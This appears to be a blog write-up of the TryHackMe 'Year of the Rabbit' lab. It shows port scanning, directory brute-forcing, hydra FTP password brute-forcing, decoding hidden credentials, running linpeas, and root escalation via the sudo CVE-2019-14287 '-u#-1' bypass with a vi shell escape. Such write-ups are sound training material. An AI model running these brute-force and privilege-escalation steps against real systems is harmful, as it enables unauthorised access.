---
title: TryHackMe - Year Of The Rabbit - WRITE-UP
date: 2021-02-18 08:46:00 +0100
categories: [TryHackMe, New Year Series]
tags: [ftp, web, puzzle, brute-force, linux, easy]
lang: en
---
## BOX NAME: [Year of The Rabbit](https://tryhackme.com/room/yearoftherabbit)
### NMAP
``` $ nmap -T4 -A -p- -Pn -oG nmap-grepable.txt 10.10.100.98 ```
``` bash 
$ @
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-22 08:13 UTC
Nmap scan report for 10.10.100.98
Host is up (0.042s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 (DSA)
|   2048 df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f (RSA)
|   256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 (ECDSA)
|_  256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 (ED25519)
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Apache2 Debian Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel


Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.83 seconds
```

We see that there's ssh, ftp open and that there's Apache webapp hosted. Let's check out webapplication:

![Main-Page](https://i.imgur.com/cfHaaIO.png)  
Let's run gobuster to find other directories

### GOBUSTER
``` $ gobuster dir -r -k -x .php,.txt,.html -r -k --wordlist ~/tools/SecLists/Directory-Bruting/raft-small-directories.txt --url 10.10.100.98 -o /home/penelope/Pentesting/CTFs/THM/Year_Of_The_Rabbit/command_output//gobuster.txt ```
``` bash 
/assets (Status: 200)
/index.html (Status: 200)
/server-status (Status: 403)
 
===============================================================
2021/01/22 08:19:30 Finished
===============================================================
```
### Exploring directories
The one that catches my eye is /assets, in there we see:
![/assets](https://i.imgur.com/0AUIBr8.png)  

A RickRolled video?!

![RickRolled](https://i.imgur.com/dG7qE4b.png)

In this video we hear that there's nothing important in this video and we should check somewhere else... I'm going to trust the author on that... xD  
But this video was not the only one in /assets. We see another file called style.css

![style.css](https://i.imgur.com/YsoueSA.png)
There we'll see a secret directory, and heading to this directory we'll get an alert:

![alert](https://i.imgur.com/BzQ2Hq7.png)
Thankfully turning off javascript is extremely easy, it is built-in option in your browser's settings:

![javascript](https://i.imgur.com/lE7Ypcm.png)
So let's change that to Disallowed and then head to the directory again.

![secret-tip](https://i.imgur.com/hsqyOay.png)

Rick again?! So are we stuck...? So I've said before that the video instructed us that we're looking in the wrong place... But what are the other places??? In the video the ivona **burps**. This is definetely a hint to use a Burp Suite.  
I personally don't like using Burp to just see the request headers. We'll use Chrome DevTools instead!: 
1. Let's open DevTools, and head up to Network tab
1. Then from the main-page go to the secret directory.
1. I see that there's one peculiar request redirecting us

![weird-request](https://i.imgur.com/wpWB4ri.png)

It looks like it's requesting some hidden directory... Let's check it too.

![hidden-directory](https://i.imgur.com/WPKg1mE.png)
So let's see this image.
![image](https://i.imgur.com/f1G2y7w.png)
It looks like we can't get any info from it. But there may be other data embedded in this image. Let's download it and run ```strings``` on it!

```strings Hot_Babe.png```


```
Eh, you've earned this. Username for FTP is ftpuser
One of these is the password:
Mou+56n%QK8sr
1618B0AUshw1M
A56IpIl%1s02u
vTFbDzX9&Nmu?
FfF~sfu^UQZmT
8FF?iKO27b~V0
ua4W~2-@y7dE$
3j39aMQQ7xFXT
Wb4--CTc4ww*-
u6oY9?nHv84D&
0iBp4W69Gr_Yf
TS*%miyPsGV54
C77O3FIy0c0sd
O14xEhgg0Hxz1
5dpv#Pr$wqH7F
1G8Ucoce1+gS5
0plnI%f0~Jw71
0kLoLzfhqq8u&
kS9pn5yiFGj6d
zeff4#!b5Ib_n
rNT4E4SHDGBkl
KKH5zy23+S0@B
3r6PHtM4NzJjE
gm0!!EC1A0I2?
HPHr!j00RaDEi
7N+J9BYSp4uaY
PYKt-ebvtmWoC
3TN%cD_E6zm*s
eo?@c!ly3&=0Z
nR8&FXz$ZPelN
eE4Mu53UkKHx#
86?004F9!o49d
SNGY0JjA5@0EE
trm64++JZ7R6E
3zJuGL~8KmiK^
CR-ItthsH%9du
yP9kft386bB8G
A-*eE3L@!4W5o
GoM^$82l&GA5D
1t$4$g$I+V_BH
0XxpTd90Vt8OL
j0CN?Z#8Bp69_
G#h~9@5E5QA5l
DRWNM7auXF7@j
Fw!if_=kk7Oqz
92d5r$uyw!vaE
c-AA7a2u!W2*?
zy8z3kBi#2e36
J5%2Hn+7I6QLt
gL$2fmgnq8vI*
Etb?i?Kj4R=QM
7CabD7kwY7=ri
4uaIRX~-cY6K4
kY1oxscv4EB2d
k32?3^x1ex7#o
ep4IPQ_=ku@V8
tQxFJ909rd1y2
5L6kpPR5E2Msn
65NX66Wv~oFP2
LRAQ@zcBphn!1
V4bt3*58Z32Xe
ki^t!+uqB?DyI
5iez1wGXKfPKQ
nJ90XzX&AnF5v
7EiMd5!r%=18c
wYyx6Eq-T^9#@
yT2o$2exo~UdW
ZuI-8!JyI6iRS
PTKM6RsLWZ1&^
3O$oC~%XUlRO@
KW3fjzWpUGHSW
nTzl5f=9eS&*W
WS9x0ZF=x1%8z
Sr4*E4NT5fOhS
hLR3xQV*gHYuC
4P3QgF5kflszS
NIZ2D%d58*v@R
0rJ7p%6Axm05K
94rU30Zx45z5c
Vi^Qf+u%0*q_S
1Fvdp&bNl3#&l
zLH%Ot0Bw&c%9
```
### FTP Brute-Forcing
So it looks like we need to brute-force ftp server with this wordlist listed here. Let's copy this wordlist to another file and then use ```hydra``` to brute-force

```hydra -l ftpuser -P wordlist.txt ftp://10.10.100.98/ ```
```
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-01-22 10:36:53
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 82 login tries (l:1/p:82), ~6 tries per task
[DATA] attacking ftp://10.10.100.98:21/
[21][ftp] host: 10.10.100.98   login: ftpuser   password: 5iez[CUTTED]KKQ
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 10 final worker threads did not complete until end.
[ERROR] 10 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-01-22 10:37:17
```

Let's log in then to this user 

```$ ftp 10.10.100.98```
```
Connected to 10.10.100.98.
220 (vsFTPd 3.0.2)
Name (10.10.100.98:cloufisz): ftpuser
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             758 Jan 23  2020 Eli's_Creds.txt
226 Directory send OK.
ftp>
```
We see the file ```Eli's_Creds.txt``` We can get this file with command

```get Eli's_Creds.txt```  -- inside ftp session
### Strange code/encoding
When viewing this file, we see
```
+++++ ++++[ ->+++ +++++ +<]>+ +++.< +++++ [->++ +++<] >++++ +.<++ +[->-
--<]> ----- .<+++ [->++ +<]>+ +++.< +++++ ++[-> ----- --<]> ----- --.<+
++++[ ->--- --<]> -.<++ +++++ +[->+ +++++ ++<]> +++++ .++++ +++.- --.<+
+++++ +++[- >---- ----- <]>-- ----- ----. ---.< +++++ +++[- >++++ ++++<
]>+++ +++.< ++++[ ->+++ +<]>+ .<+++ +[->+ +++<] >++.. ++++. ----- ---.+
++.<+ ++[-> ---<] >---- -.<++ ++++[ ->--- ---<] >---- --.<+ ++++[ ->---
--<]> -.<++ ++++[ ->+++ +++<] >.<++ +[->+ ++<]> +++++ +.<++ +++[- >++++
+<]>+ +++.< +++++ +[->- ----- <]>-- ----- -.<++ ++++[ ->+++ +++<] >+.<+
++++[ ->--- --<]> ---.< +++++ [->-- ---<] >---. <++++ ++++[ ->+++ +++++
<]>++ ++++. <++++ +++[- >---- ---<] >---- -.+++ +.<++ +++++ [->++ +++++
<]>+. <+++[ ->--- <]>-- ---.- ----. <
```
It looks like some code... reminds me of cipher code.
By googling just a tiny piece of this message, we see that it is...

![googling](https://i.imgur.com/R8Pc61w.png)
A fancy way of encoding message, and there's even decryptor, let's use it

With decrypting it **we get eli's credentials** probably to ssh

log in with ```ssh eli@10.10.100.98``` and input her/his password  
### Privilege Escalation Horizontal
In her /home directory we see basic directories like Pictures, Videos, Music etc. It seems there's no  flag straight up  
I'm going to expect that the user flag is located in some ```user.txt``` file. I'll find it with ```find``` command

```find / -type f -name 'user.txt' 2> /dev/null```  
We find that it's located in ```/home/gwendoline/user.txt``` so it's completely different user!  
I'm stuck again... after one hour and logging again to ssh I've noticed that there's **ssh banner** that is definetely not the default one!

```
1 new message
Message from Root to Gwendoline:

"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"

END MESSAGE

```

We can find it again - using ```find``` But I'll doing it with ```locate``` now

```$ locate s3cr3t ```
```
/usr/games/s3cr3t
/usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
/var/www/html/sup3r_s3cr3t_fl4g.php
```
So we see that there's even hidden file with message.
Reading it we get **password for the gwendoline user**  
**In his /home directory we see user.txt flag**

### Privilege Escalation Vertical

I'll be transfering linpeas.sh script for privesc by:

```python -m http.server 8080``` where you have linpeas.sh located.  
I want to wget get this file to /tmp directory, so I'll cd into that  
```cd /tmp```

```wget http://<YOUR_THM_IP>:8080/linpeas.sh```  
```chmod +x linpeas.sh```  
```./linpeas.sh  ```
```
====================================( Interesting Files )=====================================
[+] SUID - Check easy privesc, exploits and write perms
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
strace Not Found
-rwsr-xr-x 1 root   root       9.9K Feb 24  2014 /usr/lib/eject/dmcrypt-get-device
-rwsr-sr-x 1 root   root       9.9K Apr  1  2014 /usr/bin/X
-rwsr-sr-x 1 daemon daemon      55K Sep 30  2014 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-xr-x 1 root   root       143K Oct  5  2014 /bin/ntfs-3g  --->  Debian9/8/7/Ubuntu/Gentoo/others/Ubuntu_Server_16.10_and_others(02-2017)
-rwsr-xr-x 1 root   root        14K Oct 15  2014 /usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
-rwsr-xr-x 1 root   root        31K Nov  8  2014 /bin/fusermount
-rwsr-xr-x 1 root   root        74K Nov 20  2014 /usr/bin/gpasswd
-rwsr-xr-x 1 root   root        44K Nov 20  2014 /usr/bin/chsh
-rwsr-xr-x 1 root   root        53K Nov 20  2014 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root   root        39K Nov 20  2014 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root   root        40K Nov 20  2014 /bin/su
-rwsr-xr-x 1 root   root        15K Nov 28  2014 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root   root        23K Nov 28  2014 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
-rwsr-xr-- 1 root   messagebus 288K Feb  9  2015 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-sr-x 1 root   mail        88K Feb 11  2015 /usr/bin/procmail
-rwsr-xr-x 1 root   root        11K Feb 13  2015 /usr/bin/vmware-user-suid-wrapper
-rwsr-xr-x 1 root   root       3.0M Feb 17  2015 /usr/sbin/exim4
-rwsr-xr-x 1 root   root       147K Mar 12  2015 /usr/bin/sudo  --->  /sudo$
-rwsr-xr-x 1 root   root       455K Mar 22  2015 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root   root        27K Mar 29  2015 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root   root        40K Mar 29  2015 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-- 1 root   dip        326K Apr 14  2015 /usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
-rwsr-xr-x 1 root   root        11K Apr 15  2015 /usr/lib/pt_chown  --->  GNU_glibc_2.1/2.1.1_-6(08-1999)
```
I'm mostly looking at SUID binaries and ssh keys, but now It doesn't seem to be the case.

Running ```sudo -l``` gives me though:
```
Matching Defaults entries for gwendoline on year-of-the-rabbit:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User gwendoline may run the following commands on
        year-of-the-rabbit:
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
```
So it looks like I can edit a file user.txt as a sudo without giving a password via executing vi.  
But it gets more complicated, because this file cannot be run as root (so we cannot use ```sudo``` too).

```
sudo /usr/bin/vi /home/gwendoline/user.txt 
[sudo] password for gwendoline: 
Sorry, user gwendoline is not allowed to execute '/usr/bin/vi user.txt' as root on year-of-the-rabbit.
```
### CVE-2019-14287
There's a CVE though that relates to setting NOPASSWD rule for everyone except root. Here's the [link](https://resources.whitesourcesoftware.com/blog-whitesource/new-vulnerability-in-sudo-cve-2019-14287)

![cve](https://i.imgur.com/7eKzWlV.png)
So this is the flag... ```-u#-1``` Let's modify our previous command to:  
```sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt``` 
And within the file, proceed with the GTFOBins 
![gtfo-bins](https://i.imgur.com/Sjl3clR.png)
I'll use the second option After that, we get a root shell and we can see the flag in ```/root/root.txt```
Amazing, it was exciting box with so many elements putted into it.

